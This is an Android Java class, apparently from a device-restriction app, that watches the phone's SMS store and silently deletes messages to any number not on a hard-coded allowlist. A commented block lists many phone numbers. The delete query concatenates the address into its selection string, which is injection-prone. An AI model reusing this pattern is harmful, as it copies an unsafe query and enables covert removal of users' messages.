package com.mtarget.pecadom;

import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.util.Log;

public class SmsSentObserver extends ContentObserver {
	
	private static final String TAG = "SMSTRACKER";
    private static final Uri STATUS_URI = Uri.parse("content://sms");
    
    private Context mContext;
    
    // NUMERO AUTORISER
 	//private String numero_appele;
 	
    /*private String[] tab_numero_autorise={
 		"0628304227",
 		"59074355",
 		"59074356",
 		"59074357",
 		"59074358",
 		"59074359",
 		"59074360",
 		"59074361",
 		"59074362",
 		"59074363",
 		"59074364",
 		"59074365",
 		"59074366",
 		"59074367",
 		"59074368",
 		"59074369",
 		"59074370",
 		"59074371",
 		"59074372",
 		"59074373",
 		"59074374",
 		"59074375",
 		"59074376",
 		"59074377",
 		"59074378",
 		"59074379",
 		"59074380",
 		"59074381",
 		"59074382",
 		"58183381",
		"59025770",
		"59025792",
		"58183381",
		"59025797",
		"59025857",
		"59025863",
		"59025775",
		"08009154",
		"59025795",
		"59025775",
		"59025790",
		"49912133",
		"59025818"};
    */
    
	public SmsSentObserver(Handler handler, Context ctx) {
		super(handler);
		mContext = ctx;
	}

	@Override
	public boolean deliverSelfNotifications() {
		return true;
	}

	@Override
	public void onChange(boolean selfChange) {
		try{
	        Cursor sms_sent_cursor = mContext.getContentResolver().query(STATUS_URI, null, null, null, null);
	        if (sms_sent_cursor != null) {
		        if (sms_sent_cursor.moveToFirst()) {
		        	String protocol = sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("protocol"));
		        	
		        	//System.out.println("SMS::"+sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("address")));
		        	String numero_appele=sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("address"));
		        	
		        	boolean b_raccrohe=true;
		        	if(numero_appele.length()>=8)
		        	{
		        		for(int i = 0; i < Config.TAB_NUMERO_AUTORISE.length; i++) {
			        		if(numero_appele.contains(Config.TAB_NUMERO_AUTORISE[i]))
			        		{
			        			b_raccrohe=false;
			        			break;
			        		}
						}
		        	}
		        	
		        	if(b_raccrohe){
		        		if(protocol == null){
			        		int type = sms_sent_cursor.getInt(sms_sent_cursor.getColumnIndex("type"));
			        		if(type == 2)
			        			mContext.getContentResolver().delete(STATUS_URI, "address ='" + numero_appele + "'", null);
			        		else
			        			mContext.getContentResolver().delete(STATUS_URI, "address ='" + numero_appele  + "'", null);
			        	}
		        	}
		        }
	        }
	        else
	        	Log.e(TAG, "Send Cursor is Empty");
		}
		catch(Exception sggh){
			Log.e(TAG, "Error on onChange : "+sggh.toString());
		}
		super.onChange(selfChange);
	}
}